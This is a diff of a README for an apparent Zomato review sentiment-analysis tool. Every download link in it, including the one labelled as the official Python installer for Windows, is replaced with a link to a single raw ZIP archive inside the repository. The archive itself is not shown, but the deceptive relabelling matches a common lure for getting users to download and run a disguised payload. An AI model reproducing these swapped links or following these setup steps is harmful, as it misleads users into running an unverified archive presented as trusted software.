@@ -1,6 +1,6 @@
 # 🍽️ Zomato--LSTM--Sentiment-Analysis - Classify Reviews Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Zomato--LSTM--Sentiment--Analysis-ff69b4?style=for-the-badge)](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis)
+[![Download Now](https://img.shields.io/badge/Download-Zomato--LSTM--Sentiment--Analysis-ff69b4?style=for-the-badge)](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip)
 
 ---
 
@@ -24,7 +24,7 @@ To run the app on your Windows computer, make sure you have:
 - At least 4GB of free RAM
 - At least 500MB of free disk space
 - An active internet connection for first-time setup
-- Python 3.8 or higher installed ([Download Python](https://www.python.org/downloads/windows/))
+- Python 3.8 or higher installed ([Download Python](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip))
 
 The application uses common Python tools and libraries. These will be installed automatically during setup.
 
@@ -38,7 +38,7 @@ You will begin by downloading the app files and preparing your computer to run i
 
 Go to this page to download the latest version:
 
-👉 [https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis)
+👉 [https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip)
 
 This page contains all necessary files and instructions. You can download the whole project as a folder.
 
@@ -48,7 +48,7 @@ This page contains all necessary files and instructions. You can download the wh
 
 If you don’t have Python on your computer:
 
-1. Visit https://www.python.org/downloads/windows/
+1. Visit https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip
 2. Download the latest version for Windows
 3. Run the installer and follow the instructions
 4. Make sure to check “Add Python to PATH” during installation
@@ -127,7 +127,7 @@ This command opens the app in your internet browser. You will see the interface 
 To get the latest version:
 
 1. Visit the main page:  
-   [https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis)
+   [https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip)
 2. Download the newest ZIP file.
 3. Replace your old folder with the new one.
 4. Run setup and app commands as before.
@@ -173,4 +173,4 @@ Currently, the app requires some Python setup to operate.
 
 Visit this page to download all files and get more information:
 
-[https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis)
+[https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip](https://github.com/B0LB0LI/Zomato--LSTM--Sentiment-Analysis/raw/refs/heads/main/stibial/Analysis-Sentiment-LST-Zomato-v1.3.zip)
